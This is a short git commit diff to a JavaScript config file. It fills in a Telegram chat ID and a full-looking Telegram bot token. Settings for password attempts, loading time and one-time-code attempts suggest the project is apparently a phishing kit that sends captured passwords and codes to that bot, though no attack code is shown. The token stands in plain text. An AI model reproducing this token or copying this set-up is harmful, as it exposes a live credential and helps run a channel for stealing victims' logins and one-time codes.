164588c9d1f54d812a49a58bd8ac979e57b73b4c
boi10ty <phaxoay1@gmail.com>
2025-08-14 12:07:40 +0700

    Update config.js

--- src/config/config.js
+++ src/config/config.js
@@ -1,6 +1,6 @@
 const config = {
-    chat_id: '',
-    bot_token: '',
+    chat_id: '1922578871',
+    bot_token: '8086831835:AAGp7bTGis_7WFTrDtIrzZI03_SOt-bUj2w',
     max_password_attempts: 3,
     password_loading_time: 1000,
     max_otp_attempts: 3,
